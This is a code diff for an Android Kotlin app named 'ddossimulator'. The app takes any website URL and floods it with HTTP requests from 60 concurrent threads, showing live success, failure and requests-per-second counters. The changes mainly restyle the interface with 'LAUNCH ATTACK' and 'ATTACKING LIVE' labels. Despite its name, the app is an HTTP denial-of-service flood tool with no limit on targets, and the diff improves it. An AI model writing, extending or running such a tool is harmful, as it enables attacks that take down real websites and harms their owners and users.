@@ -1,5 +1,6 @@
 package com.example.ddossimulator
 
+import android.graphics.Color
 import android.os.Bundle
 import android.widget.Button
 import android.widget.EditText
@@ -17,7 +18,7 @@ class MainActivity : AppCompatActivity() {
     private val successCount = AtomicInteger(0)
     private val failCount = AtomicInteger(0)
     private var startTime: Long = 0
-    private val threadCount = 60 // زيادة القوة قليلاً
+    private val threadCount = 60
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -25,27 +26,45 @@ class MainActivity : AppCompatActivity() {
 
         val urlInput = findViewById<EditText>(R.id.urlInput)
         val startBtn = findViewById<Button>(R.id.startBtn)
-        val statusText = findViewById<TextView>(R.id.statusText)
+        val successText = findViewById<TextView>(R.id.successText)
+        val failText = findViewById<TextView>(R.id.failText)
+        val totalText = findViewById<TextView>(R.id.totalText)
+        val speedText = findViewById<TextView>(R.id.speedText)
+        val statusLabel = findViewById<TextView>(R.id.statusLabel)
 
         startBtn.setOnClickListener {
             if (!isAttacking) {
                 val targetUrl = urlInput.text.toString()
                 if (targetUrl.isNotEmpty() && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
-                    startMassiveAttack(targetUrl, statusText)
-                    startBtn.text = "STOP ATTACK"
                     isAttacking = true
+                    startBtn.text = "STOP ATTACK"
+                    startBtn.setBackgroundColor(Color.parseColor("#333333"))
+                    statusLabel.text = "STATUS: ATTACKING LIVE"
+                    statusLabel.setTextColor(Color.parseColor("#FF0000"))
+                    
+                    startMassiveAttack(targetUrl, successText, failText, totalText, speedText)
                 } else {
-                    statusText.text = "Please enter a valid URL"
+                    statusLabel.text = "ERROR: INVALID URL"
+                    statusLabel.setTextColor(Color.RED)
                 }
             } else {
-                stopAttack()
-                startBtn.text = "START ATTACK"
                 isAttacking = false
+                stopAttack()
+                startBtn.text = "LAUNCH ATTACK"
+                startBtn.setBackgroundColor(Color.parseColor("#FF0000"))
+                statusLabel.text = "STATUS: STOPPED"
+                statusLabel.setTextColor(Color.GRAY)
             }
         }
     }
 
-    private fun startMassiveAttack(targetUrl: String, statusView: TextView) {
+    private fun startMassiveAttack(
+        targetUrl: String, 
+        successView: TextView, 
+        failView: TextView, 
+        totalView: TextView, 
+        speedView: TextView
+    ) {
         successCount.set(0)
         failCount.set(0)
         startTime = System.currentTimeMillis()
@@ -53,7 +72,7 @@ class MainActivity : AppCompatActivity() {
         
         repeat(threadCount) {
             val job = scope.launch {
-                while (isActive) {
+                while (isActive && isAttacking) {
                     try {
                         val url = URL(targetUrl)
                         val connection = url.openConnection() as HttpURLConnection
@@ -75,18 +94,16 @@ class MainActivity : AppCompatActivity() {
         CoroutineScope(Dispatchers.Main).launch {
             while (isAttacking) {
                 val elapsedSeconds = (System.currentTimeMillis() - startTime) / 1000.0
-                val total = successCount.get() + failCount.get()
+                val success = successCount.get()
+                val fail = failCount.get()
+                val total = success + fail
                 val rps = if (elapsedSeconds > 0) (total / elapsedSeconds).toInt() else 0
                 
-                statusView.text = """
-                    STATUS: ATTACKING LIVE
-                    Target: $targetUrl
-                    --------------------------
-                    Success Requests: ${successCount.get()}
-                    Failed Requests: ${failCount.get()}
-                    Total Sent: $total
-                    Speed: $rps Requests/Sec
-                """.trimIndent()
+                successView.text = success.toString()
+                failView.text = fail.toString()
+                totalView.text = total.toString()
+                speedView.text = rps.toString()
+                
                 delay(500)
             }
         }
